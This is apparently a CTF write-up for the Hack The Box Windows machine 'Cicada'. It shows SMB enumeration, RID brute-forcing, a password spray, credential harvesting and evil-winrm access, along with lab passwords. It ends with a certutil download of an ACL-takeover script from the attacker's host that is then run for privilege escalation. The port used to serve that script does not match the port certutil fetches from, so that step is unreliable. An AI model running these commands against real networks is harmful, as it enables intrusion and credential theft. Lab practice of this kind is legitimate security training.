---
title: HTB · Cicada
slug: htb-cicada
date: 2026-08-02
image: cicada
platform: HackTheBox
os: Windows
difficulty: Easy
points: 585
tags: [hackthebox, windows, easy, retired, active-directory, smbclient, crackmapexec, smbmap, password-spray, evil-winrm]
description: Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. 
featured: true
---

# Reconnaissance
## Nmap Scanning 
```bash
nmap -A -p- -T4 -sV -Pn 10.10.24.11 -oN nmap.txt
```
### Initial Scan Results
```bash
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        (generic dns response: SERVFAIL)  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap  
DNS:CICADA-DC.cicada.htb   
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
DNS:CICADA-DC.cicada.htb  
3268/tcp  open  ldap  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
| Not valid before: 2024-08-22T20:24:16  
|_Not valid after:  2025-08-22T20:24:16  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
63654/tcp open  msrpc         Microsoft Windows RPC
```
## Hosts File
The website uses a virtual host. Add it to `/etc/hosts`:
```bash
echo "10.10.24.11 dc.cicada.htb" | sudo tee -a /etc/hosts
echo "10.10.24.11 cicada.htb" | sudo tee -a /etc/hosts
```
## Enumerating SMB TCP 445
I'll list available smb shares and see if there is one without a password.
```bash
smbclient -L \\10.10.24.11 -N  
        Sharename       Type      Comment  
        ---------       ----      -------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        DEV             Disk        
        HR              Disk        
        IPC$            IPC       Remote IPC  
        NETLOGON        Disk      Logon server share   
        SYSVOL          Disk      Logon server share
```
After trying to connect to every single one and see which is without a password I found out that i can access the HR share.
```bash
smbclient \\\\10.10.24.11\\HR
```
There is a file called `Notice from HR.txt` which has this text inside.
```
Dear new hire!  
  
Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.  
  
Your default password is: Cicada$M6Corpb*@Lp#nZp!8  
  
To change your password:  
1. Log in to your Cicada Corp account using the provided username and the default password mentioned above.  
2. Navigate to account settings to change your password.  
3. Ensure your new password is strong and contains a mix of characters.  
4. Save your changes.  
  
If you need assistance, contact support at support@cicada.htb.  
  
Best regards,    
Cicada Corp
```
## Enumerating Users
My goal is to discover domain users by performing a brute force on the RID.
```bash
crackmapexec smb cicada.htb -u anonymous -p '' --rid-brute
```
I'll save all the usernames in a text file and perform a password spray.
```bash
crackmapexec smb 10.10.24.11 -u username.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
I successfully identified a user who is using the password we discovered.  Next, we’ll attempt lateral movement to locate a user with higher privileges.
```bash
crackmapexec smb 10.10.24.11 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
```
I discovered a user whose password is stored in their account description.
```
SMB         10.10.24.11     445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 0 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
```
Then I'll run **smbmap** to verify if this user has access to additional shares, and it turns out they do have access to several more shares.
```bash
smbmap -H 10.10.24.11 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'

ADMIN$        NO ACCESS     Remote Admin 
C$            NO ACCESS     Default share  
DEV           READ ONLY  
HR            READ ONLY 
IPC$          READ ONLY     Remote IPC 
NETLOGON      READ ONLY     Logon server share   
SYSVOL        READ ONLY     Logon server share
```
I examined the ‘DEV’ share and found a PowerShell script named Backup_script.ps1.
```bash
smbclient \\\\10.10.24.11\\DEV -U 'david.orelious' -N 'aRt$Lp#7t*VQ!3'
```
After inspecting the contents of Backup_script.ps1, I uncovered a new username and password.
```
cat Backup_script.ps1      
  
$sourceDirectory = "C:\smb"  
$destinationDirectory = "D:\Backup"  
  
$username = "emily.oscars"  
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force  
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)  
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"  
$backupFileName = "smb_backup_$dateStamp.zip"  
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName  
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath  
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
## Evil-WinRM
After discovering **Emily Oscars’ credentials** (`emily.oscars / Q!3@Lp#M6b*7t*Vt`) I decided to try obtaining a shell using evil-winrm.
```bash
evil-winrm -i 10.10.24.11  -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```
And now i have the user flag.
```bash
cat user.txt
```
# Privilege Escalation
First I'll check the privileges this user has on the machine.
```bash
whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeBackupPrivilege             Back up files and directories  Enabled  
SeRestorePrivilege            Restore files and directories  Enabled  
SeShutdownPrivilege           Shut down the system           Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
There are some interesting privileges, and further research leads me to abusing tokens.

With the help of this, I understood that the ‘SeBackupPrivilege’ can be exploited to gain read access to any file. So I use this to retrieve the root.txt file.
After conducting further research, I found this [PowerShell script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)) that allowed me to access the root.txt file.
```bash
python3 -m http.server 80

certutil -urlcache -f http://10.10.17.36:8000/FullControl.ps1 FullControl.ps1
```
Now we have FullControl.ps1 on the windows system.
Next I'll just run the script  using the following command to gain access to the ‘root.txt’ file.
```powershell
. .\FullControl.ps1
Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
```
Now, we can just view the contents of the root.txt file.
```bash
cd C:\Users\administrator\Desktop
cat root.txt
```

